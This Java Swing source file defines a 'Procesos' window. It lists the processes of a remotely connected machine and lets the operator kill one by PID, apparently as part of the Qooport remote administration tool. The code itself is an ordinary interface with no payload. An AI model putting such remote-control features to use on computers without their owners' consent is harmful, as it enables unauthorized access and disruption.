package qooport.modulos.pc;

import java.awt.BorderLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JScrollPane;
import javax.swing.JTable;
import javax.swing.JToolBar;
import javax.swing.table.DefaultTableCellRenderer;
import javax.swing.table.DefaultTableModel;
import qooport.asociado.Asociado;
import qooport.gui.personalizado.BarraEstado;
import qooport.utilidades.Util;

public class Procesos extends JFrame {

    private JButton btnListar;
    private JButton btnMatar;
    private JScrollPane jScrollPane1;
    private JTable tabla;
    private Asociado servidor;
    private JToolBar barra;
    public BarraEstado barraInferior;

    public Procesos(Asociado servidor) {
        initComponents();
        this.setIconImage(Util.cargarIcono16("/resources/procesos.png").getImage());
        this.tabla.getColumnModel().getColumn(0).setCellRenderer(new CeldaIcono());
        this.servidor = servidor;
        btnListar(null);
    }

    private void initComponents() {
        this.jScrollPane1 = new JScrollPane();
        this.tabla = new JTable();
        this.btnListar = new JButton();
        this.btnMatar = new JButton();
        barraInferior = new BarraEstado();
        barra = new JToolBar();
//        setClosable(true);
        setTitle("Procesos");
//        setFrameIcon(Util.cargarIcono16("/resources/procesos.png")));
        tabla.setShowGrid(false);
        this.tabla.setAutoCreateRowSorter(true);
        this.tabla.setModel(new DefaultTableModel(new Object[0][], new String[]{"Nombre", "PID", "Nombre de Sesión", "Num. de Sesión", "Uso de Memoria", "Estado", "Usuario", "T. CPU", "Titulo Ventana/Comando"}));
        this.jScrollPane1.setViewportView(this.tabla);
        this.btnListar.setText("Listar");
        this.btnListar.setIcon(Util.cargarIcono16("/resources/refresh_blue.png"));
        this.btnListar.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                Procesos.this.btnListar(evt);

            }
        });
        this.btnMatar.setText("Matar");
        btnMatar.setIcon(Util.cargarIcono16("/resources/delete.png"));
        this.btnMatar.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                Procesos.this.btnMatar(evt);
            }
        });
        barra.setFloatable(false);
        barra.add(btnListar);
        barra.add(btnMatar);
        this.setLayout(new BorderLayout());
        this.add(barra, BorderLayout.NORTH);
        this.add(jScrollPane1, BorderLayout.CENTER);
        this.add(barraInferior, BorderLayout.SOUTH);
        this.setSize(800, 600);
        this.setIconImage(Util.cargarIcono16("/resources/procesos.png").getImage());
//        this.setResizable(true);
        this.setVisible(true);
        pack();

        
    }

    private void btnListar(ActionEvent evt) {
        DefaultTableModel m = (DefaultTableModel) this.tabla.getModel();
        if (this.tabla.getRowCount() > 0) {
            for (int i = this.tabla.getRowCount() - 1; i > -1; i--) {
                m.removeRow(i);
            }
        }
        barraInferior.setEstado("Solicitando información...");
        servidor.pedirListaProcesos();
    }

    public void limpiatabla() {
        DefaultTableModel m = (DefaultTableModel) this.tabla.getModel();
        if (this.tabla.getRowCount() > 0) {
            for (int i = this.tabla.getRowCount() - 1; i > -1; i--) {
                m.removeRow(i);
            }
        }
    }

    public void agregarFila(Object[] datos) {
        DefaultTableModel m = (DefaultTableModel) this.tabla.getModel();
        m.addRow(datos);
        barraInferior.setEstado("Procesos listados");
    }

    private void btnMatar(ActionEvent evt) {
        String pid = this.tabla.getValueAt(this.tabla.getSelectedRow(), 1).toString();
        if (pid.contains("/")) {
            pid = pid.split("/")[0];
        }
        servidor.matarProcesos(pid.replaceAll(" ", ""));
        barraInferior.setEstado("Matando proceso pid=" + pid.replaceAll(" ", ""));
        btnListar(evt);
    }

    static class CeldaIcono extends DefaultTableCellRenderer {

        public void setValue(Object value) {
            setText(value.toString());
            setIcon(Util.cargarIcono16("/resources/procesos.png"));
        }
    }

}
